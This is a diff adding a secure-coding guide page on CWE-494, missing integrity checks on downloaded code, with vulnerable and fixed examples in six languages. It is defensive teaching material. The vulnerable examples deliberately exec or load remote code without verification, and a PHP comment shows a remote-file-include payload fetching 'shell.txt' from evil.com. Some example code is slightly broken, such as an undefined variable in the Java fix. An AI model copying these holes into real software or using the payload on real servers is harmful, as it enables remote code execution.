@@ -1,0 +1,511 @@
+---
+title: "Download of Code Without Integrity Check"
+sidebarTitle: "Code Integrity Check (CWE-494)"
+description: "Mitigation for failing to verify the integrity of code downloaded from external sources (e.g., CDNs without SRI, insecure auto-updates)."
+icon: "cloud-arrow-down"
+iconType: "solid"
+---
+
+## Overview
+
+This vulnerability occurs when an application **downloads or includes code from an external source** (like a CDN, third-party repository, or update server) **without verifying its integrity**. If the external source is compromised, or if an attacker can perform a Man-in-the-Middle (MitM) attack, they can substitute the legitimate code with a malicious version. The application, trusting the source, then executes the malicious code, leading to attacks like Cross-Site Scripting (XSS), data theft, or complete system compromise. 🌐📥➡️😈
+
+---
+
+## Business Impact
+
+Failure to check code integrity can lead to severe supply chain attacks:
+* **Client-Side Attacks (XSS):** If a CDN-hosted JavaScript library is compromised, the attacker's script runs on every user's browser, potentially stealing credentials, session cookies, or PII.
+* **Server-Side Attacks (RCE):** If a server-side auto-update mechanism or remote file include downloads and executes malicious code, the attacker can gain full control of the server.
+* **Loss of Trust:** Users and customers trust that the application's code is legitimate. A breach originating from a compromised dependency erodes this trust.
+
+---
+
+<Card title="Reference Details" icon="book-open" iconType:="solid">
+  **CWE ID:** [CWE-494](https://cwe.mitre.org/data/definitions/494.html)
+  **Related CWEs:** CWE-829 (Untrusted Control Sphere), CWE-345 (Insufficient Data Verification)
+  **OWASP Top 10 (2021):** A08:2021 - Software and Data Integrity Failures
+  **Severity:** High to Critical
+</Card>
+
+---
+
+## Framework-Specific Analysis and Remediation
+
+This vulnerability manifests in two primary ways:
+1.  **Client-Side (Frontend):** Including scripts or stylesheets from CDNs without using **Subresource Integrity (SRI)**.
+2.  **Server-Side (Backend):** Implementing insecure auto-update features, or dynamically `include`/`require`-ing code from remote URLs (e.g., common in PHP).
+
+**Remediation:**
+* **Client-Side:** Always use the `integrity` attribute (with a SHA hash) in `<script>` and `<link>` tags when loading resources from external CDNs.
+* **Server-Side:** Do not include/execute code from remote URLs. If auto-updates are necessary, download packages over HTTPS, verify their digital signatures (e.g., GPG, RSA) against a trusted public key, and check file hashes against a secure manifest.
+
+---
+
+<Tabs>
+  <Tab title="Python">
+    #### Framework Context
+    This is less common in Python frameworks themselves but can occur in deployment scripts or custom application logic that fetches resources or code dynamically. The primary risk is often client-side (in Django/Flask templates).
+
+    #### Vulnerable Scenario 1: Missing Subresource Integrity (SRI) in Template
+    ```html
+    <html>
+    <head>
+      <script src="[https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js](https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js)"></script>
+    </head>
+    <body>
+      ...
+    </body>
+    </html>
+    ```
+
+    #### Vulnerable Scenario 2: Insecure Server-Side Update Check
+    A custom admin utility to "check for updates" downloads and runs a script.
+    ```python
+    # utils/updater.py
+    import requests
+    import os
+
+    def check_for_updates():
+        try:
+            # DANGEROUS: Downloading script over HTTP (vulnerable to MitM).
+            response = requests.get("[http://updates.example-utility.com/latest.py](http://updates.example-utility.com/latest.py)")
+            if response.status_code == 200:
+                script_content = response.text
+                # DANGEROUS: Executing code downloaded without signature/hash validation.
+                exec(script_content)
+        except requests.RequestException as e:
+            print(f"Failed to check for updates: {e}")
+    ```
+
+    #### Mitigation and Best Practices
+    * **Templates:** Add the `integrity` and `crossorigin` attributes to all `<script>` and `<link rel="stylesheet">` tags loading from external CDNs.
+    * **Server-Side:** Download updates over HTTPS. Validate signatures using a trusted public key (e.g., using `gnupg` or `cryptography` libraries) and check SHA hashes against a manifest file (also downloaded securely). Do not use `exec()` on untrusted code.
+
+    #### Secure Code Example
+    ```html
+    <html>
+    <head>
+      <script
+        src="[https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js](https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js)"
+        integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ=="
+        crossorigin="anonymous"
+      ></script>
+    </head>
+    <body>
+      ...
+    </body>
+    </html>
+    ```
+    ```python
+    # utils/updater_secure.py (Secure Update Concept)
+    import requests
+    import hashlib
+    # Assume 'verify_signature' function exists using a trusted public key
+    # from cryptography.hazmat.primitives.asymmetric import padding
+    # from cryptography.hazmat.primitives import hashes
+
+    def check_for_updates_secure():
+        try:
+            # SECURE: Download over HTTPS
+            package_url = "[https://updates.example-utility.com/latest.pkg](https://updates.example-utility.com/latest.pkg)"
+            manifest_url = "[https://updates.example-utility.com/latest.manifest](https://updates.example-utility.com/latest.manifest)"
+
+            pkg_response = requests.get(package_url, verify=True) # verify=True is default
+            manifest_response = requests.get(manifest_url, verify=True)
+            pkg_response.raise_for_status()
+            manifest_response.raise_for_status()
+
+            package_bytes = pkg_response.content
+            manifest = manifest_response.json() # Assume manifest is JSON
+
+            # SECURE: 1. Verify manifest signature (if manifest is signed)
+            # if not verify_signature(manifest['signature'], manifest['payload'], trusted_pub_key):
+            #    raise Exception("Invalid manifest signature!")
+
+            # SECURE: 2. Verify package hash against manifest
+            expected_hash = manifest['package_hash_sha256']
+            actual_hash = hashlib.sha256(package_bytes).hexdigest()
+            if actual_hash != expected_hash:
+                 raise Exception("Package hash mismatch!")
+
+            # SECURE: 3. Install/process the verified package (do not use exec!)
+            # (e.g., unpack to specific directory, update DB)
+            install_package(package_bytes)
+
+        except Exception as e:
+            print(f"Secure update failed: {e}")
+    ```
+
+    #### Testing Strategy
+    Scan HTML templates for `<script src="...">` and `<link rel="stylesheet" href="...">` tags loading from external domains. Ensure they have `integrity` and `crossorigin` attributes. Review server-side code for file downloads (`requests.get`, `urllib.request`) followed by execution (`exec`, `os.system`, `subprocess`) or loading (`pickle.load`). Verify signatures and hash checks are performed on downloaded code/packages.
+  </Tab>
+  <Tab title="Java">
+    #### Framework Context
+    Primarily client-side risk in templates (JSP, Thymeleaf) missing SRI. Server-side risk involves custom auto-update logic or insecure class loading from remote sources (`URLClassLoader`).
+
+    #### Vulnerable Scenario 1: Missing SRI in JSP/Thymeleaf
+    ```html
+    <script src="[https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js](https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js)"></script>
+    ```
+
+    #### Vulnerable Scenario 2: Insecure Remote Class Loading
+    ```java
+    // service/PluginLoader.java
+    import java.net.URL;
+    import java.net.URLClassLoader;
+
+    public Object loadPluginFromUrl(String urlString) throws Exception {
+        // DANGEROUS: URL loads code from an external source.
+        // If 'urlString' is attacker-controlled or served over HTTP (MitM),
+        // malicious code can be loaded and executed.
+        URL url = new URL(urlString);
+        URLClassLoader classLoader = new URLClassLoader(new URL[]{url});
+        Class<?> pluginClass = classLoader.loadClass("com.example.plugin.MainPlugin");
+        // RCE occurs upon instantiation or method call
+        Object pluginInstance = pluginClass.getDeclaredConstructor().newInstance();
+        // ... use pluginInstance ...
+        return pluginInstance;
+    }
+    ```
+
+    #### Mitigation and Best Practices
+    * **Client-Side:** Add `integrity` (SHA hash) and `crossorigin` attributes to all `<script>` and `<link>` tags loading from CDNs.
+    * **Server-Side:** **Avoid loading code from remote URLs** (`URLClassLoader` from untrusted sources). Download dependencies securely via build tools (Maven, Gradle) which support hash/signature verification. If auto-updates are essential, download over HTTPS and validate digital signatures (e.g., using `java.security.Signature`) and hashes against a secure manifest.
+
+    #### Secure Code Example
+    ```html
+    <script
+      src="[https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js](https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js)"
+      integrity="sha384-geWF76RCwLtnZ8qwWowPQNguL3RmwHVBC9FhGdlKrxdiJJigb/j/68SIy3Te4Bkz"
+      crossorigin="anonymous"
+    ></script>
+    ```
+    ```java
+    // service/PluginLoader.java (Secure - Local Loading)
+    import java.net.URL;
+    import java.net.URLClassLoader;
+    import java.nio.file.Path;
+    import java.nio.file.Paths;
+
+    public Object loadPluginFromLocal(String pluginJarName) throws Exception {
+        // SECURE: Validate pluginJarName against an allow-list of known plugins.
+        if (!isAllowedPlugin(pluginJarName)) {
+             throw new SecurityException("Plugin not allowed.");
+        }
+
+        // SECURE: Load plugin only from a trusted, local directory
+        // after it has been securely downloaded and verified (hash/signature).
+        Path pluginPath = Paths.get("/opt/myapp/plugins/", pluginJarName).normalize();
+        if (!pluginPath.startsWith("/opt/myapp/plugins/")) {
+             throw new SecurityException("Invalid plugin path.");
+        }
+
+        URL url = pluginPath.toUri().toURL();
+        URLClassLoader classLoader = new URLClassLoader(new URL[]{url}, ClassLoader.getSystemClassLoader());
+        Class<?> pluginClass = classLoader.loadClass("com.example.plugin.MainPlugin");
+        // ... instantiate and use ...
+        return pluginInstance;
+    }
+    ```
+
+    #### Testing Strategy
+    Scan frontend templates (JSP, Thymeleaf, HTML) for external `<script>` and `<link>` tags. Verify `integrity` and `crossorigin` attributes are present and correct. Review server-side code for `URLClassLoader`, `java.net.URL.openStream()` combined with class loading, or any custom "auto-update" logic. Check if downloaded code/JARs are verified using digital signatures or hashes from a secure source *before* being loaded or executed.
+  </Tab>
+  <Tab title=".NET(C#)">
+    #### Framework Context
+    Client-side risk in Razor views (`.cshtml`) missing SRI. Server-side risk in custom auto-update logic or insecure `Assembly.Load()` from remote/untrusted sources.
+
+    #### Vulnerable Scenario 1: Missing SRI in Razor Layout
+    ```html
+    <html>
+    <head>
+      <script src="[https://code.jquery.com/ui/1.13.2/jquery-ui.min.js](https://code.jquery.com/ui/1.13.2/jquery-ui.min.js)"></script>
+      <script src="[https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.min.js](https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.min.js)"
+              asp-fallback-src="~/lib/angular/angular.min.js"
+              asp-fallback-test="window.angular">
+      </script> </head>
+    </html>
+    ```
+
+    #### Vulnerable Scenario 2: Insecure Assembly Loading
+    Loading a plugin DLL from a potentially untrusted source.
+    ```csharp
+    // Services/PluginManager.cs
+    using System.Reflection;
+
+    public void LoadPlugin(string pluginPath) {
+        // DANGEROUS: Loading an assembly from a path that might be
+        // user-controlled or insecurely populated (e.g., downloaded over HTTP).
+        // Attacker provides path to malicious DLL.
+        try {
+             Assembly pluginAssembly = Assembly.LoadFrom(pluginPath);
+             // ... code to find and run plugin ...
+        } catch (Exception ex) {
+             // Handle error
+        }
+    }
+    ```
+
+    #### Mitigation and Best Practices
+    * **Client-Side:** Use ASP.NET Core's built-in **Tag Helpers for SRI** (`asp-append-version`, `asp-src-include`, `asp-fallback-href-include` etc. don't add SRI, but `asp-href-include` or `asp-src-include` with a CDN path can be paired). Manually add `integrity="..."` and `crossorigin="anonymous"` attributes.
+    * **Server-Side:** **Strongly name** assemblies and verify signatures before loading. Download updates over HTTPS, check hashes, and verify digital signatures (`Authenticode`) using .NET APIs before using `Assembly.Load()`. Load assemblies only from trusted, access-controlled directories.
+
+    #### Secure Code Example
+    ```html
+    <html>
+    <head>
+      <script
+        src="[https://code.jquery.com/ui/1.13.2/jquery-ui.min.js](https://code.jquery.com/ui/1.13.2/jquery-ui.min.js)"
+        integrity="sha384-lSjB2J1UkGlVvLMuBO/En5kLBYNfsIVB2YnFjluIfV2twR2QNmE/LANDIYbA/eH/+"
+        crossorigin="anonymous"></script>
+
+      <script src="[https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.min.js](https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.min.js)"
+              asp-fallback-src="~/lib/angular/angular.min.js"
+              asp-fallback-test="window.angular"
+              integrity="sha512-7oYXeK0OxTFxndh0erL8FsjGvrl2VMDor6fVqzlLGfwOQQqTbYsGPv4ZZ15QAF3aPCgtNaVZG5zRvoIpVHsCDg=="
+              crossorigin="anonymous">
+      </script>
+    </head>
+    </html>
+    ```
+    ```csharp
+    // Services/PluginManager.cs (Secure - Concept)
+    using System.Reflection;
+    using System.Security.Cryptography.X509Certificates; // For signature check
+
+    public void LoadPluginSecure(string pluginPath) {
+        // 1. SECURE: Validate path is within expected plugin directory
+        var secureBasePath = Path.GetFullPath("/opt/myapp/plugins");
+        var fullPluginPath = Path.GetFullPath(pluginPath);
+        if (!fullPluginPath.StartsWith(secureBasePath)) {
+             throw new SecurityException("Invalid plugin path.");
+        }
+
+        // 2. SECURE: Verify digital signature (Authenticode) of the DLL
+        //    against a trusted publisher certificate.
+        // X509Certificate signer = X509Certificate.CreateFromSignedFile(fullPluginPath);
+        // if (!IsTrustedPublisher(signer)) { // Assume IsTrustedPublisher exists
+        //     throw new SecurityException("Plugin signature is not trusted.");
+        // }
+
+        // 3. SECURE: Verify strong name if applicable
+        // AssemblyName asmName = AssemblyName.GetAssemblyName(fullPluginPath);
+        // byte[] publicKey = asmName.GetPublicKey();
+        // if (!IsExpectedPublicKey(publicKey)) { throw ... }
+
+        // 4. Load only if checks pass
+        Assembly pluginAssembly = Assembly.LoadFrom(fullPluginPath);
+        // ...
+    }
+    ```
+
+    #### Testing Strategy
+    Scan Razor views (`.cshtml`) for external `<script>`/`<link>` tags missing `integrity`/`crossorigin`. Review code for `Assembly.LoadFrom` or `Assembly.LoadFile`. Check if the source path is untrusted, and if signature/hash verification is performed *before* loading.
+  </Tab>
+  <Tab title="PHP">
+    #### Framework Context
+    Client-side risk in templates (Blade, Twig) missing SRI. Server-side risk via `include` / `require` with remote URLs enabled (`allow_url_include=On` in `php.ini`) or insecure auto-updaters.
+
+    #### Vulnerable Scenario 1: Missing SRI in Blade Template
+    ```html
+    <html>
+    <head>
+      <script src="[https://cdn.example.com/library.js](https://cdn.example.com/library.js)"></script>
+    </head>
+    </html>
+    ```
+
+    #### Vulnerable Scenario 2: Remote File Inclusion (RFI)
+    ```php
+    <?php
+    // index.php
+    // DANGEROUS: allow_url_include is enabled in php.ini
+    // ini_set('allow_url_include', 'On'); // Or set in php.ini
+
+    $module = $_GET['module'] ?? 'home';
+    // DANGEROUS: Includes file based on user input, which could be a remote URL.
+    // Input: ?module=[http://evil.com/shell.txt](http://evil.com/shell.txt)
+    // This executes the remote file's content as PHP code.
+    include($module . '.php');
+    ?>
+    ```
+
+    #### Mitigation and Best Practices
+    * **Client-Side:** Add `integrity` and `crossorigin` attributes to all `<script>` and `<link>` tags loading from CDNs in Blade/Twig templates.
+    * **Server-Side:** **Ensure `allow_url_include = Off`** in your production `php.ini` (this is the default and most critical defense against RFI). Never `include`/`require` paths constructed from user input; use an allow-list of local files (see `CWE-840` example). For auto-updates, download over HTTPS and verify signatures/hashes (`openssl_verify`, `hash_file`) before replacing files.
+
+    #### Secure Code Example
+    ```html
+    <html>
+    <head>
+      <script
+        src="[https://cdn.example.com/library.js](https://cdn.example.com/library.js)"
+        integrity="sha384-..." crossorigin="anonymous"
+      ></script>
+    </head>
+    </html>
+    ```
+    ```ini
+    ; php.ini (Secure - RFI Disabled)
+    ; SECURE: Ensure this is Off in production (default).
+    allow_url_include = Off
+    ; allow_url_fopen = On (Often needed, but keep url_include Off)
+    ```
+
+    #### Testing Strategy
+    Scan templates for external `<script>`/`<link>` tags missing `integrity`/`crossorigin`. Check `php.ini` settings for `allow_url_include`. Test `include`/`require` parameters with remote URLs (`http://...`). Check auto-update logic for HTTPS downloads and signature/hash verification.
+  </Tab>
+  <Tab title="Node.js">
+    #### Framework Context
+    Client-side risk in templates (EJS, Pug, Handlebars) missing SRI. Server-side risk from insecurely using `require()` with dynamic paths or custom auto-updaters.
+
+    #### Vulnerable Scenario 1: Missing SRI in EJS Template
+    ```html
+    <script src="[https://cdn.jsdelivr.net/npm/vue@3](https://cdn.jsdelivr.net/npm/vue@3)"></script>
+    ```
+
+    #### Vulnerable Scenario 2: Dynamic `require()` from User Input
+    While `require()` usually loads from local paths, if an attacker can control the path *and* upload files, this can lead to RCE.
+    ```javascript
+    // utils/module_loader.js
+    app.get('/load-module', (req, res) => {
+        const moduleName = req.query.module; // e.g., "moduleA"
+        try {
+            // DANGEROUS: If attacker can upload 'shell.js' and request
+            // module=../../uploads/shell
+            // (Requires Path Traversal + File Upload)
+            // Or if moduleName = 'child_process' and code uses it insecurely
+            const customModule = require('./modules/' + moduleName);
+            customModule.run(); // Execute code
+            res.send("Module executed");
+        } catch (e) { res.status(500).send("Error"); }
+    });
+    ```
+
+    #### Mitigation and Best Practices
+    * **Client-Side:** Add `integrity` and `crossorigin` attributes to all external `<script>`/`<link>` tags in templates.
+    * **Server-Side:** **Never** use `require()` with paths constructed directly from user input. Use a strict allow-list of module names. Handle auto-updates by downloading over HTTPS, verifying signatures/hashes using Node's `crypto` module, and then replacing files (requires restart or careful handling).
+
+    #### Secure Code Example
+    ```html
+    <script
+      src="[https://cdn.jsdelivr.net/npm/vue@3](https://cdn.jsdelivr.net/npm/vue@3)"
+      integrity="sha384-..." crossorigin="anonymous"
+    ></script>
+    ```
+    ```javascript
+    // utils/module_loader.js (Secure)
+    const ALLOWED_MODULES = {
+        'moduleA': './modules/moduleA',
+        'moduleB': './modules/moduleB'
+    };
+
+    app.get('/load-module-secure', (req, res) => {
+        const moduleName = req.query.module;
+        // SECURE: Validate against an allow-list.
+        if (moduleName && ALLOWED_MODULES[moduleName]) {
+             try {
+                const customModule = require(ALLOWED_MODULES[moduleName]);
+                customModule.run();
+                res.send("Module executed");
+             } catch (e) { res.status(500).send("Module load error"); }
+        } else {
+             res.status(400).send("Invalid module");
+        }
+    });
+    ```
+
+    #### Testing Strategy
+    Scan templates (EJS, Pug, etc.) for external `<script>`/`<link>` tags missing `integrity`/`crossorigin`. Review server-side code for `require()` calls using dynamic paths derived from user input. Check auto-update logic for HTTPS, signature verification, and hash checking.
+  </Tab>
+  <Tab title="Ruby">
+    #### Framework Context
+    Client-side risk in ERB/Slim/Haml templates missing SRI. Server-side risk from `Kernel.load` or `require` with untrusted paths, or insecure auto-update mechanisms.
+
+    #### Vulnerable Scenario 1: Missing SRI in ERB Layout
+    ```html
+    <html>
+    <head>
+      <%= javascript_include_tag "[https://unpkg.com/react@18/umd/react.production.min.js](https://unpkg.com/react@18/umd/react.production.min.js)" %>
+    </head>
+    </html>
+    ```
+
+    #### Vulnerable Scenario 2: `Kernel.load` with User Input
+    Using `load` to run a Ruby script based on user input.
+    ```ruby
+    # app/controllers/scripts_controller.rb
+    class ScriptsController < ApplicationController
+      before_action :require_admin # Even if admin, input might be manipulated
+
+      def run_script
+        script_name = params[:script_name] # e.g., "reports/daily.rb"
+        script_path = Rails.root.join('lib', 'tasks', script_name)
+        
+        # DANGEROUS: If script_name contains path traversal ("../../..."),
+        # it could load and execute arbitrary Ruby files from the filesystem.
+        # (Requires Path Traversal vulnerability as well)
+        if File.exist?(script_path)
+          load script_path # Executes the Ruby file
+          render plain: "Script executed"
+        else
+          render plain: "Script not found", status: :not_found
+        end
+      end
+    end
+    ```
+
+    #### Mitigation and Best Practices
+    * **Client-Side:** Add `integrity: true` (if using `javascript_include_tag` with newer Rails/sprockets) or manually add `integrity` and `crossorigin` attributes (if using plain tags or older Rails).
+    * **Server-Side:** **Never** use `load` or `require` with paths derived directly from user input. Use a strict allow-list of filenames, `File.basename` to strip paths, and ensure files are loaded from a secure, non-writable directory. Verify downloaded code/gems using checksums/signatures.
+
+    #### Secure Code Example
+    ```html
+    <html>
+    <head>
+      <script
+        src="[https://unpkg.com/react@18/umd/react.production.min.js](https://unpkg.com/react@18/umd/react.production.min.js)"
+        integrity="sha384-..." crossorigin="anonymous"
+      ></script>
+      </head>
+    </html>
+    ```
+    ```ruby
+    # app/controllers/scripts_controller.rb (Secure)
+    class ScriptsController < ApplicationController
+      before_action :require_admin
+      
+      # SECURE: Define a strict allow-list of executable scripts
+      ALLOWED_SCRIPTS = {
+        'daily_report' => 'reports/daily.rb',
+        'user_export' => 'exports/users.rb'
+      }.freeze
+
+      def run_script_secure
+        script_key = params[:script_key] # e.g., "daily_report"
+
+        # SECURE: Validate input against the allow-list
+        if script_key.present? && ALLOWED_SCRIPTS.key?(script_key)
+          script_path = Rails.root.join('lib', 'tasks', ALLOWED_SCRIPTS[script_key])
+          # Path is now trusted as it comes from the allow-list
+          if File.exist?(script_path)
+            # Use `load` or preferably run via a safer mechanism
+            # (e.g., dedicated Rake task, background job)
+            # load script_path
+            MySecureScriptRunner.perform_async(script_path.to_s) # Example: Sidekiq
+            render plain: "Script execution queued"
+          else
+            render plain: "Script file missing", status: :internal_server_error
+          end
+        else
+          render plain: "Invalid script", status: :bad_request
+        end
+      end
+    end
+    ```
+
+    #### Testing Strategy
+    Scan ERB/Slim/Haml templates for external `<script>`/`<link>` tags missing `integrity`/`crossorigin`. Review code for `load`, `require`, `eval` using dynamic paths. Test parameters with path traversal payloads (`../..`). Check update logic for HTTPS and signature/hash validation.
+  </Tab>
+</Tabs>
